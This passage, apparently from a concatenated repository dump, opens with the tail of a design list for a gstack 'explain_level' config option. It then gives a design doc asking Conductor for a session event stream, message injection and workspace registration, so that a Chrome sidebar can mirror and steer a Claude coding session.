3. **Terse opt-out** (`gstack-config set explain_level terse`). Binary: `default` vs `terse`. Terse skips the Writing Style block entirely and uses V0 prose style.
4. **Host-aware preamble echo.** `_EXPLAIN_LEVEL=$(${binDir}/gstack-config get explain_level 2>/dev/null || echo "default")`. Host-portable via existing V0 `ctx.paths.binDir` pattern.
5. **gstack-config validation.** Document `explain_level: default|terse` in header. Whitelist values. Warn on unknown with specific message + default to `default`.
6. **LOC reframe in README.** Remove "600,000+ lines of production code" hero framing. Insert `<!-- 

# FILE: docs/designs/CONDUCTOR_CHROME_SIDEBAR_INTEGRATION.md

# Chrome Sidebar + Conductor: What We Need

## What we're building

Right now when Claude is working in a Conductor workspace — editing files, running tests, browsing your app — you can only watch from Conductor's chat window. If Claude is doing QA on your website, you see tool calls scrolling by but you can't actually *see* the browser.

We built a Chrome sidebar that fixes this. When you run `$B connect`, Chrome opens with a side panel that shows everything Claude is doing in real time. You can type messages in the sidebar and Claude acts on them — "click the signup button", "go to the settings page", "summarize what you see."

The problem: the sidebar currently runs its own separate Claude instance. It can't see what the main Conductor session is doing, and the main session can't see what the sidebar is doing. They're two separate agents that don't talk to each other.

The fix is simple: make the sidebar a *window into* the Conductor session, not a separate thing.

## What we need from Conductor (3 things)

### 1. Let us watch what the agent is doing

We need a way to subscribe to the active session's events. Something like an SSE stream or WebSocket that sends us events as they happen:

- "Claude is editing `src/App.tsx`"
- "Claude is running `npm test`"
- "Claude says: I'll fix the CSS issue..."

The sidebar already knows how to render these events — tool calls show as compact badges, text shows as chat bubbles. We just need a pipe from Conductor's session to our extension.

### 2. Let us send messages into the session

When the user types "click the other button" in the Chrome sidebar, that message should appear in the Conductor session as if the user typed it in the workspace chat. The agent picks it up on its next turn and acts on it.

This is the magic moment: user is watching Chrome, sees something wrong, types a correction in the sidebar, and Claude responds — without the user ever switching windows.

### 3. Let us create a workspace from a directory

When `$B connect` launches, it creates a git worktree for file isolation. We want to register that worktree as a Conductor workspace so the user can see the sidebar agent's file changes in Conductor's file tree. This also sets up the foundation for multiple browser sessions, each with their own workspace.

## Why this matters

Today, `/qa` and `/design-review` feel like a black box. Claude says "I found 3 issues" but you can't see what it's looking at. With the sidebar connected to Conductor:

- **You watch Claude test your app** in real time — every click, every navigation, every screenshot appears in Chrome while you watch
- **You can interrupt** — "no, test the mobile view" or "skip that page" — without switching windows
- **One agent, two views** — the same Claude that's editing your code is also controlling the browser. No context duplication, no stale state

## What's already built (gstack side)

Everything on our side is done and shipping:

- Chrome extension that auto-loads when you run `$B connect`
- Side panel that auto-opens (zero setup for the user)
- Streaming event renderer (tool calls, text, results)
- Chat input with message queuing
- Reconnect logic with status banners
- Session management with persistent chat history
- Agent lifecycle (spawn, stop, kill, timeout detection)

The only change on our side: swap the data source from "local `claude -p` subprocess" to "Conductor session stream." The extension code stays the same.

**Estimated effort:** 2-3 days Conductor engineering, 1 day gstack integration.

